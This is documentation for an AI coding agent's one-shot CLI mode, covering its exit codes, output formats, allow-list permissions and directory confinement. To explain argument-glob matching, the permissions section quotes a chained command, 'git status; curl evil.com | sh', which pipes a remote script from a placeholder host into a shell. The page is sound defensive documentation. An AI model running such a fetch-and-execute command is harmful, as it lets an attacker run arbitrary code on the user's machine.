# Scripting conway

`-p`/`--print` runs one prompt and exits — conway's one-shot mode, and a
first-class way to drive the agent, not a stripped-down version of the TUI.
This page covers invoking it, its exit codes, its output formats, and how
permissions work with nobody there to answer a prompt. For the interactive
TUI, see [`interactive.md`](interactive.md); for driving conway as a library
instead of a subprocess, see [`embedding.md`](embedding.md).

## Invocation and input

Pass the prompt as `-p`'s value:

```console
conway -p "what's in this directory? use bash" --allowed-tools bash
```

Or pass `-p` with no value and pipe the prompt on stdin:

```console
echo "what's in this directory? use bash" | conway -p --allowed-tools bash
```

`-p` alone, with stdin attached to a terminal (nothing piped), is a usage
error rather than a hang — one-shot mode never blocks waiting for interactive
input. A present-but-empty stdin (piped, but nothing written) is also a usage
error, not a silent no-op.

conway exits once the root agent's turn reaches a terminal state — see
"Exit codes" below.

## Exit codes

Exit codes are the entire contract a script can rely on. Every row below
was confirmed by running the built binary and observing the actual process
exit status, not merely read off the source — the integration suite in
`crates/conway-cli/tests/oneshot.rs` drives each one through the real `-p`
entry point.

| Code | Name | When it's produced |
| --- | --- | --- |
| 0 | Completed | The root agent's turn finished with `ResultStatus::Completed`. |
| 1 | AgentFailed | The catch-all: a `Failed` terminal status whose cause is not a routing rejection, a `Rejected` or `Cancelled`-without-SIGINT status, or a `ConwayError::Io`/`Backend`/`Store` (or any other unclassified) error. |
| 2 | Usage | A malformed or conflicting flag, an empty/unreadable prompt, an unknown `--session`/`--resume` id, a malformed `--model`/`--fork-from` reference, or any `ConwayError::Config`/`AgentDef`/`Build`/`UnsupportedFeature`. |
| 4 | NoHealthyBackend | Routing could not supply any model for the turn: the role is unknown (e.g. `--role-override` naming a role the config does not define), no candidate in the role's chain was admissible (an unregistered `backend/model` pair, a health-open breaker, every fallback entry exhausted against a live backend), or the assembled context exceeds every candidate's window (`RoutingError::ContextTooLarge` — no truncation or escalation is performed). |
| 5 | BudgetExceeded | The root agent's turn finished with `ResultStatus::BudgetExceeded` (e.g. `limits.max_steps` reached). |
| 130 | Interrupted | A SIGINT was observed (once, or twice for an immediate hard exit) and the run's terminal status is `Cancelled`. |

Code 3 is unassigned. There is no permission-denied exit code, and that is
a decision, not a gap: a denied tool call becomes a tool result fed back
into the agent's own turn — the model sees the denial, may recover (pick
another tool, or finish without it), and the run legitimately continues.
Terminating the process over a denial would kill runs that complete
successfully. The denial is still observable while it happens, as a
`permission_resolved` envelope in the `jsonl` stream (and a `conway:
warning:` line on stderr in the default `text` format). Under
`--permission-mode deny`, a prompt whose model only ever proposes tool
calls therefore runs until `limits.max_steps` and exits 5, not a
permission-specific code.

A routing failure surfaces through the turn's own terminal status, not as
a separate process-level error: the runtime folds it into
`ResultStatus::Failed`, and the CLI classifies that failure's text as the
routing rejection it is. The practical consequence for a script is only
the table above — branch on 4 for "no model could serve this run," on 1
for everything else that went wrong mid-run. A *config-time* routing
problem (an invalid `[routing]`/`[roles]` table) is different: nothing
ever started, so it is a usage error (2).

## Output formats

`--output-format` selects the renderer; the default is `text`.

### `text`

Stdout carries only the assistant's final reply text, streamed as it
arrives, flushed after every delta — `conway -p "…" > out.txt` yields clean
content with nothing else mixed in. Everything else (tool-call activity,
permission resolutions, routing decisions, backend health) is a one-line
`conway: warning: …`/`conway: error: …` note on **stderr**, never stdout.
Routing decisions (`conway: routed role '…' to …`) are further gated behind
`-v`/`--verbose` — omitted at the default verbosity, shown at `-v` and
above.

### `json`

Stdout carries nothing at all until the run finishes, then exactly one JSON
object — the terminal `AgentResult` — and nothing else. Every streaming
envelope is silently dropped; this trades incremental output for "one
document in, one document out" scriptability. A real run, captured live:

```console
$ conway -p "reply with exactly the word pong and nothing else" --output-format json
```

```json
{
  "agent_id": "01KYWYFT24JSQPR1EYQXHMNQX2",
  "status": { "status": "completed" },
  "summary": "pong",
  "facts": [],
  "artifacts": [],
  "structured": null,
  "transcript_ref": "01KYWYFT24KYFWXSBS95GHCQMN",
  "usage": {
    "input_tokens": 15856,
    "output_tokens": 4454,
    "cache_read_tokens": 0,
    "cache_write_tokens": 0,
    "reasoning_tokens": 0
  },
  "steps_taken": 4
}
```

### `jsonl`

One JSON line per envelope, uniformly and unconditionally — no event-kind
filtering, unlike `text`. This is the machine-consumable mirror of the whole
stream: everything `text` suppresses or redirects to stderr (tool-call
activity, permission resolutions, routing decisions) is a line here. A real
run, captured live and trimmed to the interesting lines (a denied `bash`
call, then a plain-text answer):

```console
$ conway -p "reply with exactly the word pong and nothing else" --output-format jsonl
```

```json
{"seq":0,"ts":"2026-07-31T20:44:09.986Z","session":"01KYWYQ3BQQ0…","agent":"01KYWYQ3BQWY…","event":"user_turn","text":"reply with exactly the word pong and nothing else","prov":{"type":"user_prompt"}}
{"seq":4,"ts":"2026-07-31T20:44:09.989Z","session":"01KYWYQ3BQQ0…","agent":"01KYWYQ3BQWY…","event":"model_decision","role":"coder","chosen":{"backend":"local","model":"qwen3:4b"},"reason":{"kind":"alias_primary","alias":"coder"},"attempt":0}
{"seq":16,"ts":"2026-07-31T20:45:57.052Z","session":"01KYWYQ3BQQ0…","agent":"01KYWYQ3BQWY…","event":"tool_call_proposed","call_id":"call_li0uco4h","tool":"bash","args":{"command":"echo -n pong"}}
{"seq":17,"ts":"2026-07-31T20:45:57.052Z","session":"01KYWYQ3BQQ0…","agent":"01KYWYQ3BQWY…","event":"permission_requested","call_id":"call_li0uco4h","rendered":"echo -n pong"}
{"seq":18,"ts":"2026-07-31T20:45:57.052Z","session":"01KYWYQ3BQQ0…","agent":"01KYWYQ3BQWY…","event":"permission_resolved","call_id":"call_li0uco4h","decision":"denied_with_feedback"}
{"seq":23,"ts":"2026-07-31T20:47:55.258Z","session":"01KYWYQ3BQQ0…","agent":"01KYWYQ3BQWY…","event":"text_delta","text":"pong"}
{"seq":25,"ts":"2026-07-31T20:47:55.271Z","session":"01KYWYQ3BQQ0…","agent":"01KYWYQ3BQWY…","event":"agent_finished","result":{"agent_id":"01KYWYQ3BQWY…","status":{"status":"completed"},"summary":"pong", …},"ephemeral":false}
```

Every line is a self-contained JSON object with `seq`, `ts`, `session`,
`agent`, and `event` (the event's own kind is `event.event` for a
struct-shaped event, or a bare string like `"turn_started"` for a unit
variant, as in the excerpt above).

When a run spawns a subagent (`conway_subagent`/`conway_ask`), the stream
interleaves that child's own lifecycle lines into the parent's — each
stamped with the child's *own* session, agent, and `seq` counter, not the
root's. A trimmed excerpt from a real multi-agent run (root turn →
`conway_subagent` spawn → child text → root final text) shows the junction:

```json
{"seq":9,"ts":"2026-07-31T20:44:10.010Z","session":"01KYWY…root","agent":"01KYWY…root","event":"tool_call_started","call_id":"call_1"}
{"seq":0,"ts":"2026-07-31T20:44:10.011Z","session":"01KYWZ…child","agent":"01KYWZ…child","event":"agent_spawned","kind":"spawn","parent":"01KYWY…root"}
{"seq":8,"ts":"2026-07-31T20:44:10.400Z","session":"01KYWZ…child","agent":"01KYWZ…child","event":"agent_finished","result":{"agent_id":"01KYWZ…child", "…":"…"},"ephemeral":false}
{"seq":10,"ts":"2026-07-31T20:44:10.401Z","session":"01KYWY…root","agent":"01KYWY…root","event":"message_sent","to":"01KYWY…root","kind":"tool_result"}
```

`seq` jumps from 9 down to 0, then up to 8, then to 10 — global order is
neither monotonic nor gap-free. A consumer must apply this four-part
contract instead:

1. **`seq` is strictly increasing only WITHIN each session's own value**
   — across sessions it can go backward. Group/key lines on `session` (and
   `agent`) before relying on ordering.
2. **The root session's own lines are gap-free from 0** — the subscribed
   session's events pass the filter wholesale — UNLESS the run lagged (a
   `lagged` warning on stderr means envelopes were dropped; gaps can then
   appear anywhere).
3. **Other sessions appear only as sparse lifecycle slices**:
   `agent_spawned`/`agent_finished`/`agent_promoted` lines, stamped with the
   child's own session/agent id and its own counter. Their `seq` values are
   not contiguous, and a subagent's own turn content (its text, tool calls,
   etc.) never appears in this stream — only these lifecycle lines leak
   through.
4. **The stream ends at the `agent_finished` whose `agent` (equivalently
   `result.agent_id`) is the root agent.** Earlier `agent_finished` lines
   belong to subagents — match the id, don't break on the first one, or
   you'll truncate the run and lose the root's own final answer.

`seq` here is the live event counter — a different domain from the
stored-record `seq` shown by `conway sessions show` and `@seq` fork refs.

## Streaming

What arrives incrementally depends on the format: `text` and `jsonl` are
genuinely incremental — `text` flushes each reply chunk as the model emits
it, and `jsonl` writes and flushes one line per event as the event stream
produces it, so a consumer reading either as a pipe sees output before the
run finishes. `json` is not streaming in this sense at all — nothing reaches
stdout until the terminal `AgentResult` is available, by design (see above).

## Permissions with no human present

One-shot mode has no interactive channel to prompt through, so it fails
**closed** by default: `--permission-mode allowlist` (the default) with no
`--allowed-tools` denies every tool call, with feedback the model can see and
adapt to — never a hang, never a silent allow.

| Mode | `--allowed-tools`/`--deny-tools` | Effect |
| --- | --- | --- |
| `allowlist` (default) | Consulted. | Only a tool named by `--allowed-tools` (and not also named by `--deny-tools`) is allowed; every other call is denied with feedback. Empty `--allowed-tools` (the default) denies every tool call. |
| `deny` | Ignored entirely. | Every tool call is denied with feedback, unconditionally — the same fail-closed mechanism as an empty allow-list, just without consulting either flag. |

Neither mode ever produces a silent hang or an `AllowAlways`: one-shot's gate
never remembers a decision past the single call it was asked about, matching
"a one-shot invocation must never prompt or wait."

### Scoping an entry to specific arguments

Each entry in `--allowed-tools`/`--deny-tools` is either a bare tool name
(`bash`) or `tool_name(arg_glob)`, e.g. `bash(git *)`. A bare name matches
any call to that tool. `tool_name(arg_glob)` matches only when the tool's
primary argument — `command` for `bash`, or the sole string-valued argument
for a single-argument tool — matches the glob.

```console
conway -p "check the repo status" --allowed-tools 'bash(git *)'
```

This grants narrower access than `--allowed-tools bash`: the model may run
`git status`, `git log`, `git diff`, and so on, but a call whose `command`
doesn't start with `git ` is denied.

**The glob is matched against the argument value, not executed as a shell
prefix check.** For a `bash`-shaped call (`render_kind` `ShellCommand`), a
value containing a shell metacharacter (`;`, `|`, `&`, a backtick, `$(...)`,
a newline, ...) never matches a `tool_name(arg_glob)` entry, even if the
glob itself would otherwise match — `bash(git *)` does not authorize
`git status; curl evil.com | sh`, because the chained command is denied
before the glob is even consulted. This gate does **not** apply to a bare
tool-name entry: `--allowed-tools bash` already grants that tool
unrestricted access, so there is nothing narrower left to protect.

**A `report`/`bash` denial along the way, on an otherwise successful run, is
expected, not a bug.** A one-shot session announces every built-in tool to
the model (including `report`, which a session with no parent has no use
for) unless you populate `--allowed-tools`; when the model tries one that's
not allowed, the call is denied with feedback and the model falls back to
answering in plain text instead — exactly what the `jsonl` excerpt above
shows (`report`, then `bash`, each proposed and `denied_with_feedback`,
followed by a `text_delta` answer regardless). In `text` mode this same
sequence shows up as `conway: warning: tool call proposed: …`/`permission
denied for call …` lines on stderr; **in `json` mode you won't see it at
all** — that format carries only the terminal result, with no record of
which tools were tried and denied along the way. List the tools you
actually want the model to use via `--allowed-tools` to avoid the extra
round trip.

See [`permissions.md`](permissions.md) for pattern grants, project trust, and
everything specific to interactive (`prompt`) mode — none of which applies
here, since one-shot mode never uses that mode.

## `--cwd` and `--root`

These two flags are easy to conflate, and mixing them up is the mistake
most likely to cost you real damage — read this before you set either one.

- **`--cwd <DIR>`** sets the process's (and the root agent's own) working
  directory: where the agent *works*, and where a relative tool argument
  starts from. It is **not** a security boundary. It never limits what a
  tool call can reach — an agent given `--cwd /home/alice/project` can
  still read or write `/etc/passwd` if a tool call names that absolute
  path.
- **`--root <DIR>`** confines the root agent — and, by inheritance, every
  subagent it forks or spawns — to that directory: any tool call whose
  path argument resolves outside it is denied before your permission gate
  is ever consulted. This **is** the security boundary. A subagent can
  only narrow its inherited root further, never widen it.

Omit `--root` and the agent is **unconfined**: it can reach anywhere your
user account can reach, exactly like every invocation before this flag
existed. Set `--root` whenever you want a hard guarantee that conway
cannot touch anything outside a directory tree, regardless of what a tool
call asks for or what permission you grant it.

**When you set `--root`, also pass `--cwd` as an absolute path.** conway
must be able to verify the agent's own working directory sits inside the
root before it will start; a relative `--cwd` (or no `--cwd` at all, which
leaves the working directory at its default) can't be checked against the
root and conway refuses to start rather than guess:

```console
conway --cwd /home/alice/project --root /home/alice/project
```

`--cwd` is not supported together with `--fork-from`: a forked child always
inherits its parent session's `cwd`, so combining the two is a usage error
naming both flags rather than a silently dropped one.

## Flag reference

| Flag | Effect |
| --- | --- |
| `-p, --print [PROMPT]` | Run one prompt and exit. With a value, that's the prompt; with none, read the prompt from stdin. Absent entirely → interactive TUI. |
| `--output-format <text\|json\|jsonl>` | Selects the renderer (default `text`). See "Output formats" above. |
| `--allowed-tools <name[,name…]>` | Comma-separated tool names to allow, consulted when `--permission-mode` is `allowlist` (the default). Each entry is a bare tool name or `tool_name(arg_glob)` to scope the grant to matching arguments (see "Scoping an entry to specific arguments" above). Empty (the default) denies every tool call. |
| `--deny-tools <name[,name…]>` | Comma-separated tool names to deny even when `--allowed-tools` lists them; also accepts `tool_name(arg_glob)` entries; also consulted only in `allowlist` mode. |
| `--permission-mode <allowlist\|deny>` | See "Permissions with no human present" above. |
| `--role-override <role>` | Use this role instead of `default_role` for the session. |
| `--model <backend/model>` | Pin a specific model instead of routing through a role's chain. |
| `--session <id>` | Use (creating if new) a specific session id. |
| `--resume <id>` | Reattach to a persisted session and continue its transcript. |
| `--fork-from <id>[@seq]` | Start a new session branched from another one, optionally at a specific point in its log. Not combinable with `--cwd` (see above). |
| `--config <path>` | Load config from this exact path, bypassing the usual discovery walk. |
| `--cwd <dir>` | See "`--cwd` and `--root`" above. |
| `--root <dir>` | See "`--cwd` and `--root`" above. |
| `-v`, `-vv` (`--verbose`) | Stderr diagnostics: `-v` also surfaces routing decisions and other info-level notices; `-vv` also surfaces trace-level detail. `RUST_LOG`, if set, overrides this entirely. Never writes to stdout, at any level — one-shot's stdout-purity contract holds regardless of verbosity. |

`--session`, `--resume`, and `--fork-from` are mutually exclusive; with none
of them, conway starts a fresh session.

## Next steps

- [`interactive.md`](interactive.md) — the TUI, for a human in the loop.
- [`embedding.md`](embedding.md) — conway as a Rust library instead of a
  subprocess.
- [`permissions.md`](permissions.md) — permission modes, pattern grants,
  and project-file trust (interactive mode only).
